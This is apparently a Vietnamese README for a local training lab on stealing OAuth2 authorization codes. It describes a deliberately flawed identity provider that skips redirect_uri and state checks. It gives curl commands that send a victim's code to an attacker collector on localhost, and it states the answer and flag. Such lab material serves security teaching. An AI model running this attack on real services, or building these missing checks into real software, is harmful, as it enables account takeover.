# Lab 4.4: OAuth2 / SSO code theft

Mo phong OAuth2 authorization code grant bang ba service Flask tu chua, chay local:
- `provider.py` (IdP) `127.0.0.1:8044`
- `client.py` (relying party / SSO client) `127.0.0.1:8045`
- `attacker_collector.py` (server cua attacker) `127.0.0.1:8049`

## Lo hong co trong lab
- Provider `/authorize` KHONG kiem `redirect_uri` theo allowlist da dang ky (chi can `client_id` ton tai). Attacker dat `redirect_uri` tro ve server cua minh -> cuop authorization code cua victim.
- Code nam trong query string -> de ro ri qua `Referer`, lich su trinh duyet, log.
- Client `/login` khong sinh `state`, `/callback` khong kiem `state` -> khong chong CSRF luong dang nhap.

## Nhan vat
- Resource owner (victim): `carol`, da dang nhap san IdP (mo phong bang `/pv-login`).
- Client dang ky: `client_id=portal`, redirect_uri hop le `http://localhost:8045/callback`.

## Chay
```bash
python3 provider.py            # terminal 1
python3 client.py              # terminal 2
python3 attacker_collector.py  # terminal 3
python3 exploit.py             # terminal 4
```
(Can `pip install flask requests`.)

## Nhiem vu
1. Cuop authorization code cua carol bang redirect_uri tro ve server attacker.
2. Doi code lay access_token, doc `/userinfo` cua carol (account takeover).
3. Chung minh client thieu `state`.

## Dap an
`exploit.py` chay het cac man, ket qua that trong `transcript.txt`:
chiem tai khoan carol, flag `FLAG{4.4_oauth_code_theft}`.

## Thu nhanh bang curl
```bash
# victim lay session IdP
curl -s -c /tmp/j.txt -X POST localhost:8044/pv-login -d user=carol
# authorize voi redirect_uri cua attacker -> xem Location chua code
curl -si -b /tmp/j.txt "localhost:8044/authorize?response_type=code&client_id=portal&redirect_uri=http://localhost:8049/collect" | grep -i location
```
